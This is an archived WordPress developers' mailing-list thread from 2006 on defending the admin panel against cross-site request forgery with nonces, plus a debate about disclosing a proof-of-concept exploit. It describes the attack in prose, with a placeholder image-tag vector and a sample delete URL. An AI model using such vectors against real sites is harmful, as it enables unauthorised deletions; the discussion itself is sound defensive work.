-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From ringmaster at midnightcircus.com  Thu Apr 20 13:52:16 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Thu Apr 20 13:52:03 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <ebe43d680604200403q31482387ic05c5ad2e8491e13@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<ebe43d680604200403q31482387ic05c5ad2e8491e13@mail.gmail.com>
Message-ID: <44479210.1090409@midnightcircus.com>

> 1) The problems present in the current system.

There are many layers to this problem, which I think is what might make 
it so confusing.

Here is the current system:

A malefactor creates a link somewhere whose URL would normally be used 
by your blog's WordPress to trigger the deletion of a post with a 
specific ID (or delete some other indexed item).  The expectation is 
that you will have already logged in to your blog, so when you visit 
that page, you will not have the benefit of the login page as a barrier 
to the immediate deletion of that post.

The current system requires that a referer be sent to visit any admin 
page (although there are some that are not covered, either by choice or 
omission), and that referer must contain a URL from inside your WP admin 
panel.

This prevents the scenario fairly well, since you must now already be on 
an admin page to activate a link that deletes anything.  However, there 
are some issues with this behavior:

i) User Experience - Some browsers, some proxies, and some firewall 
software explicitly block or remove the referer information from the 
request.  As a result, admin pages do not work properly and provide a 
poor error message.  This issue has resulted in numerous support 
requests, for example:

http://wordpress.org/support/topic/15273
http://wordpress.org/support/topic/12102
http://wordpress.org/support/topic/64566
http://wordpress.org/support/topic/5573

The last thread demonstrates that this issue has been ongoing for almost 
a year.  There is also a Codex page dedicated to working around this 
problem, possibly implying that it is a common enough complaint to 
warrant documentation.

ii) Security - The system is not impenetrable.  If an unfiltered URL to 
an admin page that deletes things appears /within/ the admin (such as a 
link in a comment from the comment moderation page), and the admin 
inadvertently clicks on it, it will trigger the deletion.


> 2) A list of the options.

a) Leave things as is - This option suggests that the small amount of 
users affected by this issue are not worth the trouble of any fix.

b) Replace the referer check with nonces - Instead of verifying the 
referer at all, forms and links would be modified to include a special 
code (a nonce) that would be checked before an action is performed. 
Without the presence of this code, the action could either fail with an 
error (similar to the current referer check error) or ask "Are You 
Sure?" to confirm the action, submitting the original data on to the 
action page with an added valid nonce.

Nonces could be generated in these ways:

b-1) One method would simply generate a random value and store it in the 
database.  When verifying a nonce, WP would compare the submitted nonce 
to the one in the database.

b-2) One method would algorithmically generate a nonce based on user, 
action, time, and possibly other variables.  This nonce would not be 
stored on the server, but could be verified algorithmically.

c) Augment the referer check with nonces - Similar to option b, nonces 
would be added to forms and links when possible.  To verify a page 
request, first the nonce would be checked.  If it fails, then the 
referer would be checked as currently done.  If the referer check fails, 
then an "Are You Sure?" confirmation would appear.  If any of the checks 
pass, then no confirmation is displayed and the action continues as normal.

This option could also be pluggable, where a user can control which 
method to use by activating plugins.  A plugin could also deactivate any 
intrinsic behavior.

d) Convert every admin action that works via a GET request to a POST 
request.  GET requests would be made to work only after confirmations. 
POST requests would use the existing admin referer check.

> 3) Their relative pros/cons.

a) No new code must be written or supported.

Support requests will likely continue, and the documentation on enabling 
referer checks should likely need to be reviewed and enhanced.  Those 
browsers, proxies, and firewalls that disable access to WordPress' admin 
will likely continue to do so.  This entire topic of discussion will 
likely have been a gigantic waste of time and energy, and we will 
probably end up arguing about this again at a later time.  ;)

b) We will pick up support for users who currently have trouble with the 
referer issue.  Support for referers should be reduced, since nothing 
needs to be done to "activate" nonces.

Replacing the existing system will require new code, which must be 
tested.  Most of the code can be centralized (generating and checking 
the nonces) but each admin page will most likely be touched.  There are 
some questions about plugin admin pages that still need to be addressed, 
such as how legacy plugins will handle incoming requests since they will 
not already have the nonce generating code.

b-1) Provides a higher level of security.

Requires database storage for nonces, increasing database thrash while 
operating the admin.  May need to store more than one nonce per user 
(ie.- +per action, +per IP).  Depending on how well the data storage 
system works, this option might cause issues with using multiple browser 
instances of the admin panel or the back button.  This could happen 
when, for example, a user clicks the back button to a form that contains 
an old, previously used nonce, then submits that form.

b-2) Does not provide absolute security, since nonces generated 
algorithmically within a time period are likely to be similar or identical.

Does not require database storage.  Nonces could be generated that are 
specific to user, action, and time that do not fail after using the back 
button or using the admin from two open browsers.

c) Covers all options of b and provides some backwards compatibility for 
admin pages (via core or plugin) that do not yet have the nonces 
embedded in their links and forms.

Has all of the cons of b.

d) Puts an end to the discussion of whether actions should be performed 
on a GET request.  Makes it easier to add nonces to the forms, since all 
actions will be forms using POST requests.

Requires that a volume of links must be changed into forms, and that CSS 
be applied to prevent the admin from turning into an ugly spectacle.  By 
itself it doesn't really address the presented issues, but might better 
enable the application of b or c.

> 4) Your opinion.

If we do anything at all, it should be c with b-2.  Option c provides an 
immediate benefit to user experience by replacing most referer checks 
with nonces.  In the case that checks fail, users will no longer see an 
uninformative and prohibitive die() message, but a confirmation that 
allows them to continue.

Allowing the system to be pluggable allows people who are more concerned 
with security than what b-2 provides to use a plugin to augment that 
security.  I am of the opinion that the case is very rare that I (or 
anyone) would even have the opportunity to click on a malicious comment 
link in my admin panel, much less actually do it.  I don't believe that 
we should waste our efforts writing code for a problem that I'm not even 
aware of being in the wild, but allowing for someone else to plug the 
hole seems wise.

On the other hand, even I have been affected by the referer issue, and 
eliminating this support issue would leave us open to deal with more 
important things.

The very, very least we could do is already done - making 
check_admin_referers() pluggable.  You can write a plugin today that 
replaces that function with something that returns true no matter what. 
  It's not secure, but it'll enable the UI for people using those 
browsers, proxies, and firewalls.  This could be improved by making that 
plugin hook in that function able to circumvent the actual check.  Any 
other changes are going to be more invasive of the admin panel.

Does that cover it?

Owen

From sam at rephrase.net  Thu Apr 20 14:26:38 2006
From: sam at rephrase.net (Sam Angove)
Date: Thu Apr 20 14:30:44 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <ebe43d680604200403q31482387ic05c5ad2e8491e13@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<ebe43d680604200403q31482387ic05c5ad2e8491e13@mail.gmail.com>
Message-ID: <aa74b1910604200726vf77cab3t7ac20df0d45bfbe9@mail.gmail.com>

On 4/20/06, David House <dmhouse@gmail.com> wrote:
>
> 1) Annoyance when the referer check doesn't work, security holes
> arising from clicking links in comments within the admin, or missed
> check_admin_referer() calls.

It's a worry if users without referrers are directed to disable the
check, since it leaves them open to dangerous links or forms from
anywhere around the web, not just their own admin.

Using tokens also provides protection in case of an exploit using <img
src="[evil]" /> or similar, which is of much more cause for concern
than a malicious link. I'll be shocked if there's no-one who's enabled
posting of images in comments.

Anyway, I agree 100% with Owen. It's a security win *and* a usability
win. If it's pluggable, even better.

(I do think the legacy plugin thing is a problem, though. Is there any
way around it other than hackishly using the DOM to insert hidden
inputs? Bleh.)
From davebytes at comcast.net  Thu Apr 20 15:44:25 2006
From: davebytes at comcast.net (David Chait)
Date: Thu Apr 20 15:47:55 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net><ebe43d680604200403q31482387ic05c5ad2e8491e13@mail.gmail.com>
	<44479210.1090409@midnightcircus.com>
Message-ID: <003101c66491$4d77cc10$6e01a8c0@sixfour>

Owen wrote:
| ii) Security - The system is not impenetrable.  If an unfiltered URL to
| an admin page that deletes things appears /within/ the admin (such as a
| link in a comment from the comment moderation page), and the admin
| inadvertently clicks on it, it will trigger the deletion.

questions from this:

1. why aren't we already filtering ALL URLs that exist within posts or 
comments that contain 'wp-admin/', et al?  At the least, munge such links 
within the admin interface...  Wouldn't that remove some aspects of this 
attack vector?  Or turn links into non-clickable text (I'll copy-paste to my 
browser if it avoids security issues!  I do this daily with urls in emails 
already!).

2. the a CSRF example is much scarier.  I look at a link-hover in the status 
bar, it looks like a valid jpg link, but the thing ends up doing a redirect 
back to me with something malicious.  I can see how Nonces or other hash 
would hopefully eliminate this case.

| If we do anything at all, it should be c with b-2.

I'll buy that.  So long as the "AYS" stuff is included.

I have more thoughts, will fork a different topic... ;)

-d 

From ryan at concept64.com  Thu Apr 20 15:53:01 2006
From: ryan at concept64.com (Ryan Scheuermann)
Date: Thu Apr 20 15:57:04 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <aa74b1910604200726vf77cab3t7ac20df0d45bfbe9@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<ebe43d680604200403q31482387ic05c5ad2e8491e13@mail.gmail.com>
	<aa74b1910604200726vf77cab3t7ac20df0d45bfbe9@mail.gmail.com>
Message-ID: <4447AE5D.7090807@concept64.com>

Owen wrote:

    c) Augment the referer check with nonces - Similar to option b,
    nonces would be added to forms and links when possible.  To verify a
    page request, first the nonce would be checked.  If it fails, then
    the referer would be checked as currently done.  If the referer
    check fails, then an "Are You Sure?" confirmation would appear.  If
    any of the checks pass, then no confirmation is displayed and the
    action continues as normal.


I like Owen's c) approach but the only problem is that the security hole 
still exists:  if the nonce check fails, and check_admin_referrer 
succeeds, the action is still a go.  It's only after the 
check_admin_referrer fails that AYS is displayed?  Or do we recode only 
the vulnerable commands to REQUIRE the nonce check succeed, and others 
we let slide?

Otherwise, I would support Owen's b) with b-2) method and the re-coding 
of all core admin pages instead.  Avoiding the overhead of DB writes for 
nonces (and all the code that goes with it) seems to be a better choice 
than trying to curb the remote chance that an attacker might be able to 
mimic the nonce-generation code (assuming it uses user, action, time, 
and other variables).

The only issue is the backwards compatibility of plugins...

Maybe it's possible to just ignore the required nonces if the request 
came from a plugin page and didn't contain the nonce?  This would ensure 
the nonce checks for all the vulnerable core admin pages, but not break 
plugins without it.  As far as security goes, the security issue is only 
present on admin pages that display user input (comments, drafts, etc), 
so the majority of plugins wouldn't contain such a security hole on 
their admin plugin pages.

From Brian at TheCodeCave.com  Thu Apr 20 16:24:22 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Thu Apr 20 16:28:27 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44479210.1090409@midnightcircus.com>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF98075@dsimail.drbsystems.com>

Owen wrote some very important stuff including:
>If we do anything at all, it should be c with b-2.  Option c provides an 
>immediate benefit to user experience by replacing most referer checks 
>with nonces.  
>Does that cover it?

I wonder if we can be a bit more surgical with a fourth option.

Option D. Keep the referrer check there by default, because it does knock
out a lot of attack avenues. Provide a plugin that can disable it.  (Does
anyone mind if I give a whack at writing the plugin?)  Implement a near term
fix to CSRF attacks by adding embedded confirmations to the destructive
actions WP can take.

Possible implementation:

New file: AreYouSure.php
Sample Syntax:
AreYouSure.php?YesAction='/wp-admin/post.php?action=delete?p=123' (something
like that)

Usage:
1. AreYouSure.php creates a Nonce by hashing the current timestamp truncated
to the current minute with a random number.
2. It then assign the random number to the interactive user. (Cookiewise
perhaps but DB would be more secure)
3. Display an Are you sure? screen that refreshes at 30 seconds to a
standard Time Out screen forcing the user to hit Back and get another 30
seconds to answer and a new nonce.
4. Has the No button send a "back" command and returns the user to the
previous screen. 
5. The Yes button gets the nonce back to the server through link specified
in YesAction with the 30 second nonce tacked on as $nonce (or whatever).
6. Destructive routine in question has a single line pasted into them that
calls VerifyTempNonce($nonce).  VerifyTempNonce first stores the current
time in a variable.  Then it retrieves the random number from the
interactive user, and hashes the current time (to the minute) and if it
matches, the function succeeds.  If it doesn't match, it compares retests
using the previous minute.  If that fails, die(), otherwise allow the
function to succeed.

Possible Actions to protect: Delete Post, Delete Page, Delete Comment,
Delete Category
The links, to these actions, displayed by WP are modified to use
AreYouSure.php. Any direct links to those routines will now die() because
they don't have a nonce.

Benefits:
1. The developers & testers will have a very finite list of areas that have
changed.  
2. Some real world nonce experience will be gained and we can work at trying
to break it.
3. The developers can have some more design time to think about wp-admin
wide solutions involving: safely bypassing some/all AYS prompts, converting
"action" links from gets to posts, optimizing nonce creation/destruction,
placing hooks in the right location so that a Security Log plug-in could be
written, all the stuff that we are trying to tackle all at once in this
spaghettified thread.
4. The AreYouSure routines could be used even with non protected routines.
The passed nonce would just be ignored.

Negatives:
1. Some areas are not protected.  This would only protects the places we
decide to protect leaving potentially dangerous holes.
2. There could be a hole if cookies are used.  Reading indicates CSRF has
access to cookies.  Assuming someone could create a page that retrieves the
current cookie and then redirects to a known yes link with the Nonce action
embedded.  There would be 1-2 minutes of attack vulnerably after any
protected act was deliberately taken by the admin.  That's a pretty narrow
window to get an admin to click on/display your attack link.

Possible Improvements:
1. The yesaction parameter could easily be obscured by Rot13ing it.
2. AreYouSure.php could create the Nonce by hashing the yesaction variable
with the current timestamp truncated to the current minute and then again
with the random number.  The rest of what I described above would be the
same except that VerifyTempNonce would also have to be passed the current
url with the nonce stripped back out again.  That could narrow the security
hole I mentioned above even further if you can rely on the url passed to
AreYouSure being the same as the url as the destructive routine sees it.
I'm not sure that would always be the case but this might work...

From codehooligans at codehooligans.com  Thu Apr 20 16:56:23 2006
From: codehooligans at codehooligans.com (Paul Menard)
Date: Thu Apr 20 16:58:13 2006
Subject: [wp-hackers] Format post content outside of loop
Message-ID: <5BA52899-36C7-4782-8552-161959292D5F@codehooligans.com>

So dumb question I'm sure. I need to grab the post_content variable  
to include in an HTML email. Normally I call $post->the_content()  
which will echo the formatted content to the screen.

What I need to to apply the same formatting rules etc. How can this  
be done? Is there a single function that will let me assign the  
formatted content to a local variable?

P-
From Brian at TheCodeCave.com  Thu Apr 20 17:03:54 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Thu Apr 20 17:07:57 2006
Subject: [wp-hackers] List etiquette 
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF98075@dsimail.drbsystems.com>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF98077@dsimail.drbsystems.com>

I'd like the opinions of the PTB (powers that be), on this list, regarding
an etiquette issue.

You saw that I'd posted that "proof of concept" link.  I'm new here and
really don't know the rules of how this list is run.  So, I'd like to know:

1. Should I have posted it or not?  I'd mailed a more functional one to
Matt.  Should I have kept my mouth shut at that point?

2. Once people know that something has been done, others will try it repeat
it.  Should I have even mentioned that I had proved what we were discussing
was more than just theory?

3. Did I provide too much detail on the approach, or would it perhaps have
been alright to provide further detail?

4. The archive of this discussion is public.  Given that, would it be
unreasonable (pronounced harmful) to echo that post onto my blog?  My blog
is intended as a archive of neat technical stuff I've played with.  This
definitely qualifies.

5. The fact that I could mask the attack as a viable link when outside of
the admin area was, I think, a clever idea.  Should I have kept that to
myself even though it highlights the danger?

6. This link was rather limited in its danger.  If the attack I'd found
imposed a much greater risk, would that change any of the above?

7. If I decide to attempt to prove cookies are vulnerable, should I mention
any positive (or negative) results?  That could figure into the nonce
implementation design.  I've not responded to anyone's questions "Am I
missing something here?" Though I've read that stealing cookies is possible,
I've not seen discussions of how it is done.  That makes it more likely that
it is just rumor or no longer an issue.  If it is possible, that could
eliminate a whole avenue of discussion here.  That's why I am asking these
questions.  If I figure anything out, what should I do with that knowledge?
8. People will Google for the name of an attack and WordPress.  Should we be
careful using the names of these attack methods in these threads?

Thank you for your thoughts on these issues...
_______________________________________________
Brian Layman
www.TheCodeCave.com
 


From dmhouse at gmail.com  Thu Apr 20 17:07:36 2006
From: dmhouse at gmail.com (David House)
Date: Thu Apr 20 17:11:37 2006
Subject: [wp-hackers] Format post content outside of loop
In-Reply-To: <5BA52899-36C7-4782-8552-161959292D5F@codehooligans.com>
References: <5BA52899-36C7-4782-8552-161959292D5F@codehooligans.com>
Message-ID: <ebe43d680604201007v2db54243pfc72c8be6a514a57@mail.gmail.com>

On 20/04/06, Paul Menard <codehooligans@codehooligans.com> wrote:
> So dumb question I'm sure. I need to grab the post_content variable
> to include in an HTML email. Normally I call $post->the_content()
> which will echo the formatted content to the screen.

Actually, you never call $post->the_content(), the_content() is a
global function (not a method) which echoes $post->post_content.

If the post you want to email is one of the ones selected (i.e., it's
in $posts), then use apply_filters('the_content', $posts[n]); If it's
not, use:

$post_to_email = get_post(ID);
$content = apply_filters('the_content', $post_to_email->post_content);

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From jjb at ibiblio.org  Thu Apr 20 17:12:04 2006
From: jjb at ibiblio.org (John Joseph Bachir)
Date: Thu Apr 20 17:16:07 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <aa74b1910604200726vf77cab3t7ac20df0d45bfbe9@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<ebe43d680604200403q31482387ic05c5ad2e8491e13@mail.gmail.com>
	<aa74b1910604200726vf77cab3t7ac20df0d45bfbe9@mail.gmail.com>
Message-ID: <Pine.LNX.4.61.0604201307230.5718@tribal.metalab.unc.edu>

On Fri, 21 Apr 2006, Sam Angove wrote:

> It's a worry if users without referrers are directed to disable the 
> check, since it leaves them open to dangerous links or forms from 
> anywhere around the web, not just their own admin.
>
> Using tokens also provides protection in case of an exploit using <img 
> src="[evil]" /> or similar, which is of much more cause for concern than 
> a malicious link. I'll be shocked if there's no-one who's enabled 
> posting of images in comments.

Not to toot my own horn but... this problem is solved and implemented in 
Lyceum, using a security token for every administrative action, which 
results in an identical user experience to wordpress, and allows for 
usage of post or get requests as desired by the programmer. Is there 
anything about this solution that folks don't like?

John
----
aim/yim/msn/jabber.org: johnjosephbachir
713.494.2704
irc://irc.freenode.net/lyceum
http://lyceum.ibiblio.org/
http://blog.johnjosephbachir.org/


From Brian at TheCodeCave.com  Thu Apr 20 17:12:52 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Thu Apr 20 17:17:02 2006
Subject: [wp-hackers] Format post content outside of loop
In-Reply-To: <ebe43d680604201007v2db54243pfc72c8be6a514a57@mail.gmail.com>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF98078@dsimail.drbsystems.com>

David House said it all when he uttered:
>$content = apply_filters('the_content', $post_to_email->post_content);

Yep.  Look at functions-formatting.php's function wp_trim_excerpt for an
example of how to include a cleaned version of the post in your email...

From ryan at ryanduff.net  Thu Apr 20 17:28:25 2006
From: ryan at ryanduff.net (Ryan Duff)
Date: Thu Apr 20 17:32:37 2006
Subject: [wp-hackers] List etiquette
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF98077@dsimail.drbsystems.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98077@dsimail.drbsystems.com>
Message-ID: <4447C4B9.2040900@ryanduff.net>

Brian Layman wrote:
> I'd like the opinions of the PTB (powers that be), on this list, regarding
> an etiquette issue.
> 
> You saw that I'd posted that "proof of concept" link.  I'm new here and
> really don't know the rules of how this list is run.  So, I'd like to know:
> 
> 1. Should I have posted it or not?  I'd mailed a more functional one to
> Matt.  Should I have kept my mouth shut at that point?
> 
> 2. Once people know that something has been done, others will try it repeat
> it.  Should I have even mentioned that I had proved what we were discussing
> was more than just theory?
> 
> 3. Did I provide too much detail on the approach, or would it perhaps have
> been alright to provide further detail?
> 
> 4. The archive of this discussion is public.  Given that, would it be
> unreasonable (pronounced harmful) to echo that post onto my blog?  My blog
> is intended as a archive of neat technical stuff I've played with.  This
> definitely qualifies.
> 
> 5. The fact that I could mask the attack as a viable link when outside of
> the admin area was, I think, a clever idea.  Should I have kept that to
> myself even though it highlights the danger?
> 
> 6. This link was rather limited in its danger.  If the attack I'd found
> imposed a much greater risk, would that change any of the above?
> 
> 7. If I decide to attempt to prove cookies are vulnerable, should I mention
> any positive (or negative) results?  That could figure into the nonce
> implementation design.  I've not responded to anyone's questions "Am I
> missing something here?" Though I've read that stealing cookies is possible,
> I've not seen discussions of how it is done.  That makes it more likely that
> it is just rumor or no longer an issue.  If it is possible, that could
> eliminate a whole avenue of discussion here.  That's why I am asking these
> questions.  If I figure anything out, what should I do with that knowledge?
> 8. People will Google for the name of an attack and WordPress.  Should we be
> careful using the names of these attack methods in these threads?
> 
> Thank you for your thoughts on these issues...
> _______________________________________________
> Brian Layman
> www.TheCodeCave.com

Since you said that you tested and your proof of concept worked, it 
probably would have been better to directly send that information to 
Matt and Ryan Boren via the security@wordpress.org address.

-- 
Ryan Duff
http://ryanduff.net
AIM: ryancduff
irc.freenode.net #wordpress #plogger
From elharo at metalab.unc.edu  Thu Apr 20 17:43:24 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Thu Apr 20 17:47:55 2006
Subject: [wp-hackers] List etiquette
In-Reply-To: <4447C4B9.2040900@ryanduff.net>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98077@dsimail.drbsystems.com>
	<4447C4B9.2040900@ryanduff.net>
Message-ID: <4447C83C.2090801@metalab.unc.edu>

Ryan Duff wrote:

> Since you said that you tested and your proof of concept worked, it 
> probably would have been better to directly send that information to 
> Matt and Ryan Boren via the security@wordpress.org address.
> 


I disagree. Security by obscurity is at best 1 out of 2. Because you 
posted the proof of concept I was able to analyze it, understand it, and 
figure out how to protect myself against the attack despite a huge 
amount of misinformation that continues to be thrown around on this 
list. If you hadn't posted the proof of concept, I still wouldn't 
understand exactly what the problem is or how to prevent it.

The situation might be different if WordPress had a demonstrated record 
of rapid fixes to security holes. However it doesn't. Security reports 
tend to be trivialized, denied, and discarded. If bug fixes ever show 
up, they're only for the absolute latest version leaving users of older 
versions unprotected and exposed. Given that attitude, we're much better 
off knowing as much as possible about any proposed exploit so we can 
protect ourselves.

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From codehooligans at codehooligans.com  Thu Apr 20 18:05:27 2006
From: codehooligans at codehooligans.com (Paul Menard)
Date: Thu Apr 20 18:07:11 2006
Subject: [wp-hackers] Format post content outside of loop
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF98078@dsimail.drbsystems.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98078@dsimail.drbsystems.com>
Message-ID: <8EA06432-82D5-4B67-AD1D-6FB962BD37EF@codehooligans.com>


On Apr 20, 2006, at 12:12 PM, Brian Layman wrote:

> David House said it all when he uttered:
>> $content = apply_filters('the_content', $post_to_email- 
>> >post_content);
>
> Yep.  Look at functions-formatting.php's function wp_trim_excerpt  
> for an
> example of how to include a cleaned version of the post in your  
> email...
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

Very cool. Thanks all. And sorry for the mis-quote on the function.  
Correct 'the_content();
From m at mullenweg.com  Thu Apr 20 19:15:10 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Thu Apr 20 19:19:25 2006
Subject: [wp-hackers] List etiquette
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF98077@dsimail.drbsystems.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98077@dsimail.drbsystems.com>
Message-ID: <4447DDBE.2070109@mullenweg.com>

Brian Layman wrote:
> 1. Should I have posted it or not?  I'd mailed a more functional one to
> Matt.  Should I have kept my mouth shut at that point?

The best thing to do when you think you have a security problem is to 
mail it to security@wordpress.org.

I see now you sent a mail directly to me, but for many reasons I'm often 
several days behind on my mail, but the security alias goes to several 
folks and get a high priority.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From ryan at ryanduff.net  Thu Apr 20 19:17:15 2006
From: ryan at ryanduff.net (Ryan Duff)
Date: Thu Apr 20 19:21:35 2006
Subject: [wp-hackers] List etiquette
In-Reply-To: <4447C83C.2090801@metalab.unc.edu>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98077@dsimail.drbsystems.com>	<4447C4B9.2040900@ryanduff.net>
	<4447C83C.2090801@metalab.unc.edu>
Message-ID: <4447DE3B.5060601@ryanduff.net>

Elliotte Harold wrote:
> Ryan Duff wrote:
> 
>> Since you said that you tested and your proof of concept worked, it 
>> probably would have been better to directly send that information to 
>> Matt and Ryan Boren via the security@wordpress.org address.
>>
> 
> 
> I disagree. Security by obscurity is at best 1 out of 2. Because you 
> posted the proof of concept I was able to analyze it, understand it, and 
> figure out how to protect myself against the attack despite a huge 
> amount of misinformation that continues to be thrown around on this 
> list. If you hadn't posted the proof of concept, I still wouldn't 
> understand exactly what the problem is or how to prevent it.
> 
> The situation might be different if WordPress had a demonstrated record 
> of rapid fixes to security holes. However it doesn't. Security reports 
> tend to be trivialized, denied, and discarded. If bug fixes ever show 
> up, they're only for the absolute latest version leaving users of older 
> versions unprotected and exposed. Given that attitude, we're much better 
> off knowing as much as possible about any proposed exploit so we can 
> protect ourselves.
> 


I was not giving you a right vs wrong. I was just answering your 
question on list etiquette. My statement was based off previous emails 
and was "filling you in". I agree security by obscurity is not the best 
way, some other people don't.

-- 
Ryan Duff
http://ryanduff.net
AIM: ryancduff
irc.freenode.net #wordpress #plogger
From m at mullenweg.com  Thu Apr 20 19:33:17 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Thu Apr 20 19:37:24 2006
Subject: [wp-hackers] List etiquette
In-Reply-To: <4447C83C.2090801@metalab.unc.edu>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98077@dsimail.drbsystems.com>	<4447C4B9.2040900@ryanduff.net>
	<4447C83C.2090801@metalab.unc.edu>
Message-ID: <4447E1FD.4070106@mullenweg.com>

Elliotte Harold wrote:
> I disagree. Security by obscurity is at best 1 out of 2. Because you 
> posted the proof of concept I was able to analyze it, understand it, and 
> figure out how to protect myself against the attack despite a huge 
> amount of misinformation that continues to be thrown around on this 
> list. If you hadn't posted the proof of concept, I still wouldn't 
> understand exactly what the problem is or how to prevent it.

Yes, but the main responsibility of developers is not to Elliotte 
Harold. Your selfish interests do not coincide with the WP community.

I also missed your patch on Trac.

Publishing line-by-line exploits or details about security 
vulnerabilities when we do a release would help crackers far more than 
our general user base, which is overwhelmingly non-technical. We get 
flak about it, but frankly I care far more about our non-savvy and more 
vulnerable users than security-blinded idealists.

This is not "security by obscurity," our source code, SVN diffs, and 
Trac tickets are entirely public, it's just common sense of trying to 
help your users more than script kiddies.

Firefox has a very similar approach.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From Brian at TheCodeCave.com  Thu Apr 20 19:37:31 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Thu Apr 20 19:41:55 2006
Subject: [wp-hackers] List etiquette
In-Reply-To: <4447DE3B.5060601@ryanduff.net>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF98079@dsimail.drbsystems.com>

Ryan Duff wrote: "Elliotte Harold wrote "Ryan Duff wrote:"" but was thinking
Brian Layman wrote: "Ryan Duff wrote:"
>>> Since you said that you tested and your proof of concept worked, it 
>>> probably would have been better to directly send that information to 
>>> Matt and Ryan Boren via the security@wordpress.org address.
>> I disagree. Security by obscurity is at best 1 out of 2. Because you 
>> posted the proof of concept I was able to analyze it, understand it, and 
> I was not giving you a right vs wrong. I was just answering your 
> question on list etiquette. 

Don't worry Ryan, Elliotte was also just adding his thoughts on my question.
:)

_______________________________________________
Brian Layman
www.TheCodeCave.com
"Obfuscation through verbosity"
 

From ryan at ryanduff.net  Thu Apr 20 19:40:17 2006
From: ryan at ryanduff.net (Ryan Duff)
Date: Thu Apr 20 19:44:28 2006
Subject: [wp-hackers] List etiquette
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF98079@dsimail.drbsystems.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98079@dsimail.drbsystems.com>
Message-ID: <4447E3A1.1000809@ryanduff.net>

Brian Layman wrote:
> Ryan Duff wrote: "Elliotte Harold wrote "Ryan Duff wrote:"" but was thinking
> Brian Layman wrote: "Ryan Duff wrote:"
>>>> Since you said that you tested and your proof of concept worked, it 
>>>> probably would have been better to directly send that information to 
>>>> Matt and Ryan Boren via the security@wordpress.org address.
>>> I disagree. Security by obscurity is at best 1 out of 2. Because you 
>>> posted the proof of concept I was able to analyze it, understand it, and 
>> I was not giving you a right vs wrong. I was just answering your 
>> question on list etiquette. 
> 
> Don't worry Ryan, Elliotte was also just adding his thoughts on my question.
> :)
> 
> _______________________________________________
> Brian Layman
> www.TheCodeCave.com
> "Obfuscation through verbosity"

I caught that after I sent it. Its been a long day so I figured I'd let 
it slide and see if anyone else caught on.

Nice job on the wrote: ... wrote: ... wrote: line ;)

-- 
Ryan Duff
http://ryanduff.net
AIM: ryancduff
irc.freenode.net #wordpress #plogger
From Brian at TheCodeCave.com  Thu Apr 20 21:05:41 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Thu Apr 20 21:09:50 2006
Subject: [wp-hackers] List etiquette
In-Reply-To: <4447E3A1.1000809@ryanduff.net>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF9807D@dsimail.drbsystems.com>

Ryan Duff opined:
>Nice job on the wrote: ... wrote: ... wrote: line ;)
Thanks! If I have to make them myself, I figure I may as well make 'em
interesting.
But what I really like is that "Obfuscation through verbosity" I added to my
sig.  I just might make that the tag line for my blog!

Oooo - now there's a neat plug in... A rotating blog tag line. Ehhh I bet
someone made it already...

From m at mullenweg.com  Thu Apr 20 21:21:23 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Thu Apr 20 21:25:32 2006
Subject: [wp-hackers] Comment # Update
Message-ID: <4447FB53.3010408@mullenweg.com>

It would be cool if...

When you AJAX approve (or unapprove) a comment on the comment screen or 
edit post screen it bumped the "Awaiting Moderation (x)" number.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From podz at tamba2.org.uk  Thu Apr 20 21:40:08 2006
From: podz at tamba2.org.uk (Podz)
Date: Thu Apr 20 21:44:11 2006
Subject: [wp-hackers] Theme resetting
